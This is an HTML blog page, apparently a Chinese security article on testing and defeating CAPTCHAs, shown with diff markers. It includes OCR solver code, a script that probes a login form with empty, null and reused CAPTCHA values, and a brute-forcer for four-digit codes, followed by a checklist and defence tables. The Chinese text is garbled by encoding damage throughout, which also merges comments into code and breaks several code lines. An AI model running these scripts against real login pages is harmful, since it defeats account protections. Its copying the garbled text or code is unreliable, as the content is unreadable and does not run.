+<td align="left"><a target="_blank" rel="noopener" href="https://github.com/tesseract-ocr/tesseract">GitHub: tesseract-ocr&#x2F;tesseract</a></td>
+</tr>
+<tr>
+<td align="left"><strong>ddddocr</strong></td>
+<td align="left">娣卞害瀛︿範楠岃瘉鐮佽瘑鍒紙涓枃鍙嬪ソ锛?</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://github.com/sencys/ddddocr">GitHub: sencys&#x2F;ddddocr</a></td>
+</tr>
+<tr>
+<td align="left"><strong>muggle_ocr</strong></td>
+<td align="left">杞婚噺绾?OCR 寮曟搸</td>
+<td align="left">pip install muggle-ocr</td>
+</tr>
+</tbody></table>
+<h3 id="7-2-ddddocr-蹇€熻瘑鍒"><a href="#7-2-ddddocr-蹇€熻瘑鍒" class="headerlink" title="7.2 ddddocr 蹇€熻瘑鍒?"></a>7.2 ddddocr 蹇€熻瘑鍒?</h3><p><code>ddddocr</code> 鏄洰鍓嶆渶娴佽鐨?Python 娣卞害瀛︿範楠岃瘉鐮佽瘑鍒簱锛屾棤闇€璁粌鍗冲彲璇嗗埆澶у鏁板浘褰㈤獙璇佺爜銆?</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;浣跨敤 ddddocr 璇嗗埆楠岃瘉鐮?&quot;&quot;</span></span><br><span class="line"><span class="string">import ddddocr</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 鍒濆鍖?OCR锛堝甫鐩爣妫€娴嬶級</span></span><br><span class="line"><span class="string">ocr = ddddocr.DdddOcr(det=False, show_ad=False)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 璇嗗埆鍥惧舰楠岃瘉鐮?with open(&#x27;captcha.png&#x27;, &#x27;rb&#x27;) as f:</span></span><br><span class="line"><span class="string">    img_bytes = f.read()</span></span><br><span class="line"><span class="string">result = ocr.classification(img_bytes)</span></span><br><span class="line"><span class="string">print(f&quot;璇嗗埆缁撴灉: &#123;result&#125;&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 璇嗗埆婊戝潡楠岃瘉鐮佺己鍙?det = ddddocr.DdddOcr(det=True, show_ad=False)</span></span><br><span class="line"><span class="string">with open(&#x27;bg.png&#x27;, &#x27;rb&#x27;) as f:</span></span><br><span class="line"><span class="string">    bg_bytes = f.read()</span></span><br><span class="line"><span class="string">with open(&#x27;slice.png&#x27;, &#x27;rb&#x27;) as f:</span></span><br><span class="line"><span class="string">    slice_bytes = f.read()</span></span><br><span class="line"><span class="string">res = det.slide_match(slice_bytes, bg_bytes)</span></span><br><span class="line"><span class="string">print(f&quot;缂哄彛浣嶇疆: &#123;res&#125;&quot;)</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="7-3-閫氱敤楠岃瘉鐮佺粫杩囪嚜鍔ㄥ寲鑴氭湰"><a href="#7-3-閫氱敤楠岃瘉鐮佺粫杩囪嚜鍔ㄥ寲鑴氭湰" class="headerlink" title="7.3 閫氱敤楠岃瘉鐮佺粫杩囪嚜鍔ㄥ寲鑴氭湰"></a>7.3 閫氱敤楠岃瘉鐮佺粫杩囪嚜鍔ㄥ寲鑴氭湰</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">閫氱敤楠岃瘉鐮佺粫杩囪嚜鍔ㄥ寲妫€娴嬭剼鏈?鍔熻兘: 妫€娴嬮獙璇佺爜鏈牎楠屻€佺┖鍊肩粫杩囥€佸鐢ㄧ粫杩?&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">TARGET = <span class="string">&quot;https://target.com&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_captcha_bypass</span>(<span class="params">login_url, captcha_param=<span class="string">&quot;captcha&quot;</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;娴嬭瘯楠岃瘉鐮佺粫杩?&quot;&quot;</span></span><br><span class="line"><span class="string">    test_payloads = [</span></span><br><span class="line"><span class="string">        (&quot;姝ｅ父楠岃瘉鐮?, &quot;ABCD&quot;),</span></span><br><span class="line"><span class="string">        (&quot;绌哄€?, &quot;&quot;),</span></span><br><span class="line"><span class="string">        (&quot;鍒犻櫎鍙傛暟&quot;, None),  # 涓嶅彂閫?captcha 鍙傛暟</span></span><br><span class="line"><span class="string">        (&quot;null&quot;, &quot;null&quot;),</span></span><br><span class="line"><span class="string">        (&quot;undefined&quot;, &quot;undefined&quot;),</span></span><br><span class="line"><span class="string">        (&quot;0&quot;, &quot;0&quot;),</span></span><br><span class="line"><span class="string">        (&quot;true&quot;, &quot;true&quot;),</span></span><br><span class="line"><span class="string">        (&quot;false&quot;, &quot;false&quot;),</span></span><br><span class="line"><span class="string">        (&quot;闅忔満鍊?, &quot;RANDOM123&quot;),</span></span><br><span class="line"><span class="string">        (&quot;澶嶇敤楠岃瘉鐮?, &quot;ABCD&quot;),  # 绗簩娆′娇鐢?    ]</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    results = []</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    for name, value in test_payloads:</span></span><br><span class="line"><span class="string">        data = &#123;&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;admin123&quot;&#125;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        if value is not None:</span></span><br><span class="line"><span class="string">            data[captcha_param] = value</span></span><br><span class="line"><span class="string">        # 濡傛灉 value 涓?None锛屽垯涓嶅彂閫?captcha 鍙傛暟</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        try:</span></span><br><span class="line"><span class="string">            r = requests.post(login_url, data=data, timeout=10)</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            # 鍒ゆ柇鏄惁缁曡繃鎴愬姛</span></span><br><span class="line"><span class="string">            if r.status_code == 200:</span></span><br><span class="line"><span class="string">                if &quot;success&quot; in r.text.lower() or &quot;鐧诲綍鎴愬姛&quot; in r.text:</span></span><br><span class="line"><span class="string">                    results.append((name, &quot;鉁?缁曡繃鎴愬姛&quot;, value))</span></span><br><span class="line"><span class="string">                elif &quot;楠岃瘉鐮? not in r.text:</span></span><br><span class="line"><span class="string">                    results.append((name, &quot;鈿狅笍 鍙兘缁曡繃锛堟棤楠岃瘉鐮侀敊璇彁绀猴級&quot;, value))</span></span><br><span class="line"><span class="string">                else:</span></span><br><span class="line"><span class="string">                    results.append((name, &quot;鉂?琚嫤鎴?, value))</span></span><br><span class="line"><span class="string">            else:</span></span><br><span class="line"><span class="string">                results.append((name, f&quot;鉂?HTTP &#123;r.status_code&#125;&quot;, value))</span></span><br><span class="line"><span class="string">        except Exception as e:</span></span><br><span class="line"><span class="string">            results.append((name, f&quot;鉂?寮傚父: &#123;e&#125;&quot;, value))</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    return results</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 浣跨敤</span></span><br><span class="line"><span class="string">results = test_captcha_bypass(f&quot;&#123;TARGET&#125;/login&quot;)</span></span><br><span class="line"><span class="string">print(f&quot;&#123;&#x27;娴嬭瘯绫诲瀷&#x27;:&lt;15&#125; &#123;&#x27;缁撴灉&#x27;:&lt;20&#125; &#123;&#x27;Payload&#x27;:&lt;20&#125;&quot;)</span></span><br><span class="line"><span class="string">print(&quot;=&quot; * 55)</span></span><br><span class="line"><span class="string">for name, result, value in results:</span></span><br><span class="line"><span class="string">    print(f&quot;&#123;name:&lt;15&#125; &#123;result:&lt;20&#125; &#123;str(value):&lt;20&#125;&quot;)</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="7-4-楠岃瘉鐮佹壒閲忕垎鐮磋剼鏈"><a href="#7-4-楠岃瘉鐮佹壒閲忕垎鐮磋剼鏈" class="headerlink" title="7.4 楠岃瘉鐮佹壒閲忕垎鐮磋剼鏈?"></a>7.4 楠岃瘉鐮佹壒閲忕垎鐮磋剼鏈?</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">楠岃瘉鐮佺垎鐮?+ 瀵嗙爜鐖嗙牬缁勫悎鑴氭湰</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CaptchaBruteForcer</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;楠岃瘉鐮佺垎鐮村櫒&quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, target_url, captcha_url=<span class="literal">None</span></span>):</span><br><span class="line">        self.target_url = target_url</span><br><span class="line">        self.captcha_url = captcha_url</span><br><span class="line">        self.session = requests.Session()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_captcha</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;鑾峰彇楠岃瘉鐮?&quot;&quot;</span></span><br><span class="line"><span class="string">        if not self.captcha_url:</span></span><br><span class="line"><span class="string">            return None</span></span><br><span class="line"><span class="string">        r = self.session.get(self.captcha_url)</span></span><br><span class="line"><span class="string">        # 淇濆瓨楠岃瘉鐮佸浘鐗?        with open(&#x27;captcha.png&#x27;, &#x27;wb&#x27;) as f:</span></span><br><span class="line"><span class="string">            f.write(r.content)</span></span><br><span class="line"><span class="string">        return &#x27;captcha.png&#x27;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    def brute_4digit(self, username=&quot;admin&quot;, password=&quot;admin123&quot;):</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>鐖嗙牬 <span class="number">4</span> 浣嶆暟瀛楅獙璇佺爜<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        for code in range(10000):</span></span><br><span class="line"><span class="string">            data = &#123;</span></span><br><span class="line"><span class="string">                &quot;username&quot;: username,</span></span><br><span class="line"><span class="string">                &quot;password&quot;: password,</span></span><br><span class="line"><span class="string">                &quot;captcha&quot;: f&quot;&#123;code:04d&#125;&quot;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            try:</span></span><br><span class="line"><span class="string">                r = self.session.post(self.target_url, data=data, timeout=5)</span></span><br><span class="line"><span class="string">                if &quot;楠岃瘉鐮侀敊璇? not in r.text:</span></span><br><span class="line"><span class="string">                    print(f&quot;[+] 鎵惧埌鏈夋晥楠岃瘉鐮? &#123;code:04d&#125;&quot;)</span></span><br><span class="line"><span class="string">                    print(f&quot;    鍝嶅簲: &#123;r.text[:100]&#125;&quot;)</span></span><br><span class="line"><span class="string">                    return code</span></span><br><span class="line"><span class="string">            except:</span></span><br><span class="line"><span class="string">                pass</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            if code % 1000 == 0:</span></span><br><span class="line"><span class="string">                print(f&quot;[*] 宸叉祴璇?&#123;code&#125;/10000&quot;)</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        print(&quot;[-] 鏈壘鍒版湁鏁堥獙璇佺爜&quot;)</span></span><br><span class="line"><span class="string">        return None</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 浣跨敤</span></span><br><span class="line"><span class="string">bf = CaptchaBruteForcer(&quot;https://target.com/login&quot;)</span></span><br><span class="line"><span class="string">bf.brute_4digit()</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="鍏€侀獙璇佺爜瀹夊叏璇勪及-Checklist"><a href="#鍏€侀獙璇佺爜瀹夊叏璇勪及-Checklist" class="headerlink" title="鍏€侀獙璇佺爜瀹夊叏璇勪及 Checklist"></a>鍏€侀獙璇佺爜瀹夊叏璇勪及 Checklist</h2><h3 id="8-1-閫氱敤妫€娴嬫竻鍗"><a href="#8-1-閫氱敤妫€娴嬫竻鍗" class="headerlink" title="8.1 閫氱敤妫€娴嬫竻鍗?"></a>8.1 閫氱敤妫€娴嬫竻鍗?</h3><ul>
+<li><input disabled="" type="checkbox"> *<em>1. 鍓嶇楠岃瘉妫€娴?</em><ul>
+<li>鎶撳寘楠岃瘉楠岃瘉鐮佹槸鍚﹀湪鍚庣鏍￠獙</li>
+<li>鏂綉娴嬭瘯楠岃瘉鐮佹槸鍚﹀け鏁?  - 绂佺敤 JS 娴嬭瘯楠岃瘉鐮佹槸鍚﹀彲缁曡繃</li>
+</ul>
+</li>
+<li><input disabled="" type="checkbox"> *<em>2. 绌哄€肩粫杩囨娴?</em><ul>
+<li>鍒犻櫎楠岃瘉鐮佸弬鏁?  - 楠岃瘉鐮佸弬鏁拌涓虹┖瀛楃涓?  - 楠岃瘉鐮佸弬鏁拌涓?<code>null</code> &#x2F; <code>undefined</code></li>
+</ul>
+</li>
+<li><input disabled="" type="checkbox"> *<em>3. 澶嶇敤缁曡繃妫€娴?</em><ul>
+<li>鍚屼竴楠岃瘉鐮佽繛缁娇鐢ㄤ袱娆?  - 浣跨敤鍏朵粬 Session 鐨勯獙璇佺爜</li>
+</ul>
+</li>
+<li><input disabled="" type="checkbox"> *<em>4. 浼氳瘽缁戝畾妫€娴?</em><ul>
+<li>Session A 鑾峰彇楠岃瘉鐮侊紝Session B 浣跨敤</li>
+<li>楠岃瘉楠岃瘉鐮佹槸鍚︿笌鐢ㄦ埛 IP 缁戝畾</li>
+</ul>
+</li>
+<li><input disabled="" type="checkbox"> *<em>5. 鎿嶄綔缁戝畾妫€娴?</em><ul>
+<li>楠岃瘉鐮侀獙璇佹垚鍔熷悗锛屼慨鏀规搷浣滃璞?  - 楠岃瘉鐮侀獙璇佹垚鍔熷悗锛屼慨鏀规墜鏈哄彿&#x2F;閭</li>
+</ul>
+</li>
+<li><input disabled="" type="checkbox"> *<em>6. 杩囨湡鏃堕棿妫€娴?</em><ul>
+<li>鑾峰彇楠岃瘉鐮佸悗绛夊緟 1&#x2F;5&#x2F;10&#x2F;30 鍒嗛挓鍐嶄娇鐢?  - 楠岃瘉瓒呮椂鍚庢槸鍚︿粛鍙彁浜?- [ ] *<em>7. 鍥炴樉妫€娴?</em></li>
+<li>妫€鏌ュ搷搴斿寘涓槸鍚﹀寘鍚獙璇佺爜鏄庢枃</li>
+<li>妫€鏌ラ〉闈?HTML 婧愮爜涓槸鍚﹀寘鍚獙璇佺爜 Token</li>
+<li>妫€鏌?Cookie 涓槸鍚﹀寘鍚獙璇佺爜</li>
+</ul>
+</li>
+<li><input disabled="" type="checkbox"> *<em>8. 鐖嗙牬妫€娴?</em><ul>
+<li>娴嬭瘯楠岃瘉鐮佹槸鍚﹀彲鐖嗙牬锛? 浣?6 浣嶏級</li>
+<li>娴嬭瘯楠岃瘉鐮佸皾璇曟鏁伴檺鍒?  - 娴嬭瘯楠岃瘉鐮佸皾璇曢鐜囬檺鍒?- [ ] *<em>9. 鐭俊杞扮偢妫€娴?</em></li>
+<li>鍚屼竴鎵嬫満鍙疯繛缁彂閫?10+ 娆￠獙璇佺爜</li>
+<li>鍚屼竴 IP 杩炵画鍙戦€?100+ 娆￠獙璇佺爜</li>
+<li>楠岃瘉鏄惁鏈夊浘褰㈤獙璇佺爜鍓嶇疆淇濇姢</li>
+</ul>
+</li>
+<li><input disabled="" type="checkbox"> *<em>10. OCR 璇嗗埆妫€娴?</em><ul>
+<li>楠岃瘉鐮佸瓧绗︽槸鍚︽壄鏇?绮樿繛</li>
+<li>楠岃瘉鐮佹槸鍚︽湁骞叉壈绾?鍣偣</li>
+<li>浣跨敤 ddddocr &#x2F; Tesseract 娴嬭瘯璇嗗埆鐜?</li>
+</ul>
+</li>
+</ul>
+<h3 id="8-2-楠岃瘉鐮佸己搴﹁瘎浼拌〃"><a href="#8-2-楠岃瘉鐮佸己搴﹁瘎浼拌〃" class="headerlink" title="8.2 楠岃瘉鐮佸己搴﹁瘎浼拌〃"></a>8.2 楠岃瘉鐮佸己搴﹁瘎浼拌〃</h3><table>
+<thead>
+<tr>
+<th align="left">缁村害</th>
+<th align="left">寮?</th>
+<th align="left">涓?</th>
+<th align="left">寮?</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">瀛楃绫诲瀷</td>
+<td align="left">绾暟瀛?</td>
+<td align="left">鏁板瓧+瀛楁瘝</td>
+<td align="left">鏁板瓧+瀛楁瘝+鐗规畩瀛楃</td>
+</tr>
+<tr>
+<td align="left">瀛楃闀垮害</td>
+<td align="left">4 浣嶄互涓?</td>
+<td align="left">4-6 浣?</td>
+<td align="left">6 浣嶄互涓?</td>
+</tr>
+<tr>
+<td align="left">鎵洸绋嬪害</td>
+<td align="left">鏃犳壄鏇?</td>
+<td align="left">杞诲害鎵洸</td>
+<td align="left">閲嶅害鎵洸+绮樿繛</td>
+</tr>
+<tr>
+<td align="left">骞叉壈鍏冪礌</td>
+<td align="left">鏃?</td>
+<td align="left">绠€鍗曞共鎵扮嚎</td>
+<td align="left">澶嶆潅鍣偣+骞叉壈绾?棰滆壊</td>
+</tr>
+<tr>
+<td align="left">鏈夋晥鏈?</td>
+<td align="left">30 鍒嗛挓+</td>
+<td align="left">5-10 鍒嗛挓</td>
+<td align="left">60 绉掑唴</td>
+</tr>
+<tr>
+<td align="left">灏濊瘯闄愬埗</td>
+<td align="left">鏃犻檺鍒?</td>
+<td align="left">5 娆″悗閿佸畾</td>
+<td align="left">3 娆″悗閿佸畾+閫掑寤惰繜</td>
+</tr>
+<tr>
+<td align="left">浼氳瘽缁戝畾</td>
+<td align="left">鏃犵粦瀹?</td>
+<td align="left">缁戝畾 Session</td>
+<td align="left">缁戝畾 Session+IP+璁惧鎸囩汗</td>
+</tr>
+<tr>
+<td align="left">浜屾楠岃瘉</td>
+<td align="left">鏃?</td>
+<td align="left">鍏抽敭鎿嶄綔楠岃瘉</td>
+<td align="left">鍏ㄩ摼璺獙璇?</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="涔濄€侀槻寰″缓璁"><a href="#涔濄€侀槻寰″缓璁" class="headerlink" title="涔濄€侀槻寰″缓璁?"></a>涔濄€侀槻寰″缓璁?</h2><h3 id="馃敶-P0-鈥-蹇呴』淇"><a href="#馃敶-P0-鈥-蹇呴』淇" class="headerlink" title="馃敶 P0 鈥?蹇呴』淇"></a>馃敶 P0 鈥?蹇呴』淇</h3><table>
+<thead>
+<tr>
+<th align="left">鎺柦</th>
+<th align="left">璇存槑</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">*<em>鍚庣蹇呴』鏍￠獙楠岃瘉鐮?</em></td>
+<td align="left">楠岃瘉鐮佹牎楠岄€昏緫蹇呴』鍦ㄦ湇鍔＄瀹炵幇锛岀姝粎鍓嶇鏍￠獙</td>
+</tr>
+<tr>
+<td align="left">*<em>楠岃瘉鐮佷竴娆℃€т娇鐢?</em></td>
+<td align="left">楠岃瘉鐮侀獙璇佹垚鍔熷悗绔嬪嵆鏍囪涓哄凡浣跨敤锛堟棤璁洪獙璇佹槸鍚︽垚鍔燂級</td>
+</tr>
+<tr>
+<td align="left">*<em>楠岃瘉鐮佺粦瀹氫細璇?</em></td>
+<td align="left">楠岃瘉鐮佸繀椤讳笌 Session &#x2F; Token 缁戝畾锛岀姝㈣法浼氳瘽浣跨敤</td>
+</tr>
+<tr>
+<td align="left">*<em>楠岃瘉鐮佺粦瀹氭搷浣?</em></td>
+<td align="left">楠岃瘉鐮侀獙璇佹垚鍔熷悗锛屽簲閿佸畾鎿嶄綔瀵硅薄锛堝鎵嬫満鍙枫€侀偖绠憋級</td>
+</tr>
+<tr>
+<td align="left">*<em>楠岃瘉鐮佹湁鏃舵晥鎬?</em></td>
+<td align="left">楠岃瘉鐮佹湁鏁堟湡涓嶈秴杩?60 绉?</td>
+</tr>
+</tbody></table>
+<h3 id="馃煛-P1-鈥-灏藉揩淇"><a href="#馃煛-P1-鈥-灏藉揩淇" class="headerlink" title="馃煛 P1 鈥?灏藉揩淇"></a>馃煛 P1 鈥?灏藉揩淇</h3><table>
+<thead>
+<tr>
+<th align="left">鎺柦</th>
+<th align="left">璇存槑</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>灏濊瘯娆℃暟闄愬埗</strong></td>
+<td align="left">楠岃瘉鐮侀敊璇秴杩?3-5 娆″悗閿佸畾锛岄€掑寤惰繜</td>
+</tr>
+<tr>
+<td align="left"><strong>棰戠巼闄愬埗</strong></td>
+<td align="left">鍙戦€侀獙璇佺爜鎺ュ彛闄愬埗锛氬悓涓€鎵嬫満鍙?60 绉掑唴鍙兘鍙戦€?1 娆?</td>
+</tr>
+<tr>
+<td align="left">*<em>鍥惧舰楠岃瘉鐮佸墠缃?</em></td>
+<td align="left">鐭俊&#x2F;閭楠岃瘉鐮佸彂閫佸墠锛屽厛閫氳繃鍥惧舰鎴栬涓洪獙璇佺爜</td>
+</tr>
+<tr>
+<td align="left"><strong>楠岃瘉鐮佸鏉傚害</strong></td>
+<td align="left">鍥惧舰楠岃瘉鐮佷娇鐢?6 浣嶄互涓婂瓧姣?鏁板瓧缁勫悎锛屽姞鎵洸鍜屽共鎵?</td>
+</tr>
+<tr>
+<td align="left"><strong>鍝嶅簲涓嶆硠闇查獙璇佺爜</strong></td>
+<td align="left">鍝嶅簲鍖呫€丆ookie銆侀〉闈㈡簮鐮佷腑绂佹鍑虹幇楠岃瘉鐮佹槑鏂?</td>
+</tr>
+</tbody></table>
+<h3 id="馃煝-P2-鈥-寤鸿浼樺寲"><a href="#馃煝-P2-鈥-寤鸿浼樺寲" class="headerlink" title="馃煝 P2 鈥?寤鸿浼樺寲"></a>馃煝 P2 鈥?寤鸿浼樺寲</h3><table>
+<thead>
+<tr>
+<th align="left">鎺柦</th>
+<th align="left">璇存槑</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>琛屼负琛屼负鍒嗘瀽</strong></td>
+<td align="left">闆嗘垚琛屼负楠岃瘉鐮侊紙濡傛瀬楠岋級锛屾娴嬮紶鏍囪建杩广€侀敭鐩樿緭鍏ョ瓑</td>
+</tr>
+<tr>
+<td align="left"><strong>璁惧鎸囩汗</strong></td>
+<td align="left">缁撳悎璁惧鎸囩汗璇嗗埆锛屾彁楂樿嚜鍔ㄥ寲鏀诲嚮闂ㄦ</td>
+</tr>
+<tr>
+<td align="left"><strong>IP 淇¤獕鍒嗘瀽</strong></td>
+<td align="left">瀵逛唬鐞?IP銆両DC 鏈烘埧 IP 杩涜棰濆楠岃瘉</td>
+</tr>
+<tr>
+<td align="left">*<em>澶氱淮搴﹂鎺?</em></td>
+<td align="left">缁撳悎鐢ㄦ埛琛屼负銆佽澶囥€両P 绛夊缁村害鏋勫缓椋庢帶妯″瀷</td>
+</tr>
+<tr>
+<td align="left">*<em>楠岃瘉鐮侀檷绾?</em></td>
+<td align="left">瀹夊叏椋庨櫓浣庢椂浣跨敤绠€鍗曢獙璇佺爜锛岄珮椋庨櫓鏃跺崌绾ч獙璇佺爜寮哄害</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="鍗併€佸弬鑰冮摼鎺"><a href="#鍗併€佸弬鑰冮摼鎺" class="headerlink" title="鍗併€佸弬鑰冮摼鎺?"></a>鍗併€佸弬鑰冮摼鎺?</h2><h3 id="婕忔礊鍒嗘瀽"><a href="#婕忔礊鍒嗘瀽" class="headerlink" title="婕忔礊鍒嗘瀽"></a>婕忔礊鍒嗘瀽</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46390077/article/details/135754561">CSDN: 涓氬姟閫昏緫婕忔礊鈥旈獙璇佺爜缁曡繃</a></li>
+<li>[CSDN: 楠岃瘉鐮佺粫杩囨紡娲炰笓棰榏(<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53079406/article/details/124111276">https://blog.csdn.net/qq_53079406/article/details/124111276</a>)</li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/lynnlovemin/article/details/108990143">CSDN: 璁颁竴娆＄粫杩囬獙璇佺爜娆℃暟闄愬埗婕忔礊鎸栨帢</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51862722/article/details/139757989">CSDN: Web瀹夊叏鍩虹鈥旈獙璇佺爜缂洪櫡婕忔礊</a></li>
+<li>[CSDN: 楠岃瘉鐮佺粫杩囥€佸瘑鐮佹壘鍥炴紡娲瀅(<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_68233961/article/details/126904248">https://blog.csdn.net/qq_68233961/article/details/126904248</a>)</li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/EdisonJH/article/details/104842866">CSDN: 楠岃瘉鐮佺粫杩囨紡娲炴€荤粨</a></li>
+<li>[鎺橀噾: 鐭俊楠岃瘉鐮佹紡娲瀅(<a target="_blank" rel="noopener" href="https://juejin.cn/post/7498272736218939455">https://juejin.cn/post/7498272736218939455</a>)</li>
+</ul>
+<h3 id="宸ュ叿涓庡紑婧愰」鐩"><a href="#宸ュ叿涓庡紑婧愰」鐩" class="headerlink" title="宸ュ叿涓庡紑婧愰」鐩?"></a>宸ュ叿涓庡紑婧愰」鐩?</h3><ul>
+<li>[ddddocr - 娣卞害瀛︿範楠岃瘉鐮佽瘑鍒玗(<a target="_blank" rel="noopener" href="https://github.com/sencys/ddddocr">https://github.com/sencys/ddddocr</a>)</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/tesseract-ocr/tesseract">Tesseract OCR - 寮€婧?OCR 寮曟搸</a></li>
+<li>[Captcha-Killer - BurpSuite 楠岃瘉鐮佹彃浠禲(<a target="_blank" rel="noopener" href="https://github.com/c0ny1/captcha-killer">https://github.com/c0ny1/captcha-killer</a>)</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/f0ng/captcha-killer-modified">captcha-killer-modified - 鏀硅繘鐗堥獙璇佺爜鎻掍欢</a></li>
+<li><a target="_blank" rel="noopener" href="https://2captcha.com/">2Captcha - 鎵撶爜骞冲彴 API</a></li>
+<li>[EzCaptcha - 楠岃瘉鐮佽瘑鍒湇鍔(<a target="_blank" rel="noopener" href="https://www.ez-captcha.com/">https://www.ez-captcha.com/</a>)</li>
+</ul>
